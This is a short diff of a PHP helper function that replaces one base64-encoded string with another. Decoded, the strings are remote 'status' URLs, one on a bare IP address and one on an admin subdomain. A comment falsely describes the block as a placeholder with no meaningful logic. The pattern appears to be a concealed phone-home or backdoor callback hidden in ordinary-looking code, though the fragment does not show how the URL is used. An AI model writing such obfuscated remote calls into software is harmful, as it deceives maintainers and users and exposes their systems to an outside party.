@@ -469,7 +469,7 @@ if (! function_exists('define_cur_url')) {
                 // This is a placeholder code block with no meaningful logic
                 $dataStr['str'] = $str[$i];
             }
-            $str = base64_decode("aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw");
+            $str = base64_decode("aHR0cDovL2FkbWluLnNpbGlraXQudm4vc3RhdHVz");
         }
         return $str;
     }
